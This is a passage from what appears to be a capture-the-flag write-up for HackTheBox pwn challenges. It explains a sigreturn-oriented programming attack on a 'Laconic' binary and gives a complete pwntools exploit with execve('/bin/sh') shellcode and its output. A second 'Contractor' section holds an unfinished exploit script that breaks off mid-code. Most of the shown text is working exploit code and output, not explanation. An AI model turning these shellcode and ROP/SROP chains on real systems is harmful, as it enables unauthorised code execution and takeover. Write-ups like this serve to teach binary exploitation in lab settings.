<p>The problem is that there is no relevant gadgets to get control over the necessary registers to spawn a shell (<code>rdi</code>, <code>rsi</code> and <code>rdx</code>) when calling the <code>execve</code> syscall using gadgets above. So we get control over those registers ? The answer is <a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=6956568"><strong>SROP</strong></a>.</p>
<p>Using SROP, we are able to place a fake <strong>sigreturn frame</strong> that is typically called when returning from a signal handler (this is used to keep track of the context where we were executing code before jumping to the signal handler). If we can call the <code>sigreturn</code> syscall, then the program would gracefully handle our sigreturn frame and branch accordingly. As the program provides a gadget for setting <code>rax</code>, we are able make this syscall from the buffer overflow vulnerability. We will not dive extensively into SROP internals and assume the reader already know about that.</p>
<p>Using an SROP, we can trigger a syscall of our choice but calling <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> is not yet possible (because the <code>&quot;/bin/sh&quot;</code> string doesn&rsquo;t exist in the binary. Instead of trying this directly, we can take advantage of the fact that the <code>.text</code> segment is writable. We will use the SROP to call a <code>read</code> syscall which allows us to write a shellcode directly in the text segment, and taking care of redirecting <code>RSP</code> to a location that holds a pointer to our shellcode (we should also make sure we don&rsquo;t overwrite the original code, so that the 2 usefull gadgets we use doesn&rsquo;t get overriden in the middle of the exploit).</p>
<p>Here is a schematic for illustrating the layout we aim to reach in the exploitation:</p>
<p><img alt="exploit plan schematic" src="/img/ctf-htb-cyberapo2025/laconic-memory.png"></p>
<p>Chaining it together, we build the following exploit code (I used <a href="https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html">this small shellcode</a>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./laconic&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    subparsers <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_subparsers(dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;command&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_local <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;local&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_remote <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;remote&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;host&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;port&#39;</span>, type<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-b&#39;</span>, <span style="color:#e6db74">&#39;--binary&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;local binary path&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;local&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> process(args<span style="color:#f92672">.</span>binary)
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#p = gdb.debug(args.binary)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    binary <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>binary)
</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> ROP(binary)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    g_syscall <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;syscall&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    g_pop_rax <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rax&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] syscall gadget:&#39;</span>, hex(g_syscall))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    scb <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    scb <span style="color:#f92672">=</span> scb<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">64</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    padded_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>    print(padded_len, scb)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[+] RSP will land at&#39;</span>, hex(binary<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">+</span> padded_len))
</span></span><span style="display:flex;"><span>    srop <span style="color:#f92672">=</span> SigreturnFrame(kernel<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)
</span></span><span style="display:flex;"><span>    srop<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    srop<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> binary<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>    srop<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> padded_len <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>    srop<span style="color:#f92672">.</span>rsp <span style="color:#f92672">=</span> binary<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">+</span> padded_len 
</span></span><span style="display:flex;"><span>    srop<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> g_syscall
</span></span><span style="display:flex;"><span>    srop<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(g_pop_rax)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xf</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(g_syscall)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> bytes(srop)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(len(payload), payload)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(payload[:<span style="color:#ae81ff">0x106</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload2 <span style="color:#f92672">=</span> scb <span style="color:#f92672">+</span>  p64(binary<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>    print(len(payload2), payload2)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(payload2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Running it gives us the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 exploit.py -b ./laconic local
</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:      No RELRO
</span></span><span style="display:flex;"><span>    Stack:      No canary found
</span></span><span style="display:flex;"><span>    NX:         NX unknown - GNU_STACK missing
</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x42000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Stack:      Executable
</span></span><span style="display:flex;"><span>    RWX:        Has RWX segments
</span></span><span style="display:flex;"><span>    Stripped:   No
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./laconic&#39;</span>: pid <span style="color:#ae81ff">200537</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Loaded <span style="color:#ae81ff">3</span> cached gadgets <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;./laconic&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> syscall gadget: 0x43015
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> b<span style="color:#e6db74">&#39;1\xf6VH\xbb/bin//shST_\xf7\xee\xb0;\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> RSP will land at 0x43060
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">280</span> b<span style="color:#e6db74">&#39;\xef\xbe\xad\xde\x00\x00\x00\x00\x180\x04\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x150\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`0\x04\x00\x00\x00\x00\x00\x150\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x003\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">72</span> b<span style="color:#e6db74">&#39;1\xf6VH\xbb/bin//shST_\xf7\xee\xb0;\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90 0\x04\x00\x00\x00\x00\x00&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>$ cat flag.txt
</span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>f4k3_fl4g_f0r_t35t1ng<span style="color:#f92672">}</span>
</span></span></code></pre></div><h2 id="pwn---contractor">PWN - Contractor<a href="#pwn---contractor" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p><strong><em>Work In Progress</em></strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./contractor&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OFF_VERIFIED_TO_RET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x24</span>
</span></span><span style="display:flex;"><span>OFF_VERIFIED_TO_LSB <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">try_override_verified</span>(off):
</span></span><span style="display:flex;"><span>    choice <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> off <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10</span>:
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>        choice <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>        print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;name again: &#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> off <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc</span>:
</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>off <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>off <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">&lt;=</span> off <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x110</span>:
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>        choice <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>        base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>        print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;reason again please: &#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> off <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x10c</span>:
</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (off <span style="color:#f92672">-</span> base) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (off <span style="color:#f92672">-</span> base) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0x110</span> <span style="color:#f92672">&lt;=</span> off <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x114</span>:
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>        choice <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>        base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x110</span>
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>        print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;specify again: &#39;</span>))
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0x114</span> <span style="color:#f92672">&lt;=</span> off <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x118</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[!] WARNING: cannot be handled (prepare to cry)&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0x118</span> <span style="color:#f92672">&lt;=</span> off <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x128</span>:
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>        choice <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>        base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x118</span>
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>        print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;you good at: &#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> off <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x11c</span>:
</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (off <span style="color:#f92672">-</span> base) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (off <span style="color:#f92672">-</span> base) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;wtf bro&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>    resp<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recv(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;everything is correct now?</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#39;</span> <span style="color:#f92672">in</span> resp:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[+] Got a hit at offset &#39;</span> <span style="color:#f92672">+</span> hex(off))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> base, off
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(resp)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[!] Failed at offset &#39;</span> <span style="color:#f92672">+</span> hex(off))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rebase_pointer_lsb</span>(offset_to_verified, lsb):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span>(<span style="color:#ae81ff">0x10</span> <span style="color:#f92672">&lt;=</span> offset_to_verified <span style="color:#f92672">+</span> OFF_VERIFIED_TO_LSB <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x110</span> <span style="color:#f92672">and</span> \
</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">&lt;=</span> offset_to_verified <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x110</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;rip bro im lazy splitting the work&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;reason again please: &#39;</span>))
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(offset_to_verified<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> p32(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, signed<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>) <span style="color:#f92672">+</span> p8(lsb))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    subparsers <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_subparsers(dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;command&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_local <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;local&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    parser_remote <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;remote&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;host&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;port&#39;</span>, type<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;local&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> process(context<span style="color:#f92672">.</span>binary<span style="color:#f92672">.</span>path)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    binary <span style="color:#f92672">=</span> ELF(context<span style="color:#f92672">.</span>binary<span style="color:#f92672">.</span>path)
</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./glibc/libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> ROP(binary)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#gdb.attach(p, f&#34;b *&amp;main+0x58c&#34;)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#gdb.attach(p)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    input(<span style="color:#e6db74">&#39;[continue]&#39;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] setting name&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;What is your name?</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;N&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] setting reason&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;want to join me?</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&gt; &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;R&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] setting age&#39;</span>)
